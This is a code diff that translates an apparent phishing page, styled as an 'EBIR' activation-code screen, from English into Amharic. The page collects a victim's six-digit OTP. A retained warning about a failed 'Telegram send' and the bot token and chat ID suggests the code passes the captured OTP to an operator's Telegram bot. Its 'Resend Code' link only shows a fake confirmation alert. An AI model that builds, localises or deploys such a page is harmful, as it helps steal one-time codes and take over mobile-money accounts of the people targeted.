@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="am">
 
 <head>
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
 
-    <title>EBIR Activation Code</title>
+    <title>EBIR የማግበሪያ ኮድ</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
@@ -266,13 +266,13 @@ Responsive
     <div class="app">
 
         <header class="header">
-            <img class="header-img" src="ebirr.jpeg" alt="EBIR Header">
+            <img class="header-img" src="ebirr.jpeg" alt="EBIR ራስጌ">
         </header>
 
         <div class="content">
 
             <p>
-                Please confirm with the OTP code sent on your Mobile Number or Email Address
+                እባክዎ በሞባይል ቁጥርዎ ወይም በኢሜል አድራሻዎ የተላከውን የOTP ኮድ ያረጋግጡ
             </p>
 
             <div class="otp">
@@ -290,11 +290,11 @@ Responsive
 
         <div class="footer">
 
-            <button id="activate">Activate</button>
+            <button id="activate">አግብር</button>
 
             <div class="bottom">
-                Did not received activation code?
-                <a href="#" id="resend">Resend Code</a>
+                የማግበሪያ ኮድ አልደረሰዎትም?
+                <a href="#" id="resend">ኮዱን እንደገና ላክ</a>
             </div>
 
         </div>
@@ -305,7 +305,7 @@ Responsive
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
-            Please wait while we verify your activation code
+            እባክዎ የማግበሪያ ኮድዎ እየተረጋገጠ ሲሆን ይጠብቁ
         </div>
     </div>
 
@@ -578,14 +578,14 @@ Responsive
             let otp = getOTP();
 
             if (otp.length !== 6) {
-                alert("Please enter the 6-digit activation code.");
+                alert("እባክዎ ባለ 6-አሃዝ የማግበሪያ ኮድ ያስገቡ።");
                 otpInputs[0].focus();
                 return;
             }
 
             // Disable button to prevent double-submit
             activateBtn.disabled = true;
-            activateBtn.textContent = "Processing...";
+            activateBtn.textContent = "በሂደት ላይ...";
 
             // Show spinner
             spinnerOverlay.style.display = 'flex';
@@ -597,8 +597,8 @@ Responsive
                 console.warn("Telegram send failed — check your bot token and chat ID.");
                 spinnerOverlay.style.display = 'none';
                 activateBtn.disabled = false;
-                activateBtn.textContent = "Activate";
-                alert("Failed to send activation request. Please try again.");
+                activateBtn.textContent = "አግብር";
+                alert("የማግበሪያ ጥያቄውን መላክ አልተሳካም። እባክዎ እንደገና ይሞክሩ።");
                 return;
             }
 
@@ -626,7 +626,7 @@ Responsive
         document.getElementById("resend").addEventListener("click", function(e) {
 
             e.preventDefault();
-            alert("A new activation code has been sent.");
+            alert("አዲስ የማግበሪያ ኮድ ተልኳል።");
             resetOTPInputs();
 
         });
